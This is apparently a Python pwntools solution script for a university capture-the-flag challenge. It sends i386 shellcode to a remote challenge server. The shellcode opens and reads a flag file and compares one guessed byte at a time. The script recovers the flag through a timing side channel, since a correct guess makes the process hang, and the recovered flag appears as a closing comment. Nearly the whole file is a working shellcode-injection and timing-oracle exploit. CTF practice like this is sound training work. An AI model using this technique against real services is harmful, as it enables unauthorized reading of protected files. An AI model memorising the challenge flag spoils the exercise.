from pwn import *
import time

context.arch = "i386"
context.os = "linux"
context.terminal = ['tmux', 'new-window']

shellcode =\
'''jmp short shell
start:
    xor eax, eax
    xor edx, edx
    pop ebx
    mov eax, 0x5
    xor ecx, ecx
    int 0x80

    sub esp, 0x80
    mov ebx, eax
    mov ecx, esp
    mov eax, 0x3
    mov edx, 0x1000
    int 0x80

    xor edx, edx
    mov ecx, esp
    add ecx, $OFFSET
    mov dl, $CHAR

    cmp byte ptr [ecx], dl
    jne end

    loop:
        nop
        jmp loop
    end:

    shell:
        call start
        .string "/home/ctf/flag"
'''

def shellcode_builder(shellcode, offset, char):
    newShellcode =  shellcode.replace("$OFFSET", str(offset)).replace("$CHAR", str(char))
    return newShellcode

def findFlag(shellcode, flag):
    for offset in range(0, 100):
        for c in range(31, 127):
            newShellcode = shellcode_builder(shellcode, offset, c)
            # S = process("./bin")
            S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10009)
            S.sendline(asm(newShellcode))
            startTime = time.time()
            S.recvall(timeout=5)
            endTime = time.time() - startTime
            S.close()
            if endTime > 4.5:
                flag += chr(c)
                print("Flag: ", flag)
                break
            if c == 126:
                return flag
    return flag


#S = gdb.debug("./bin", '''
#    break * main+96
#    break * main+114
#    continue
#''')

print("FLAG:" + findFlag(shellcode, ""))



# STT{1_SAY_NOTHING_OOOOOPSS}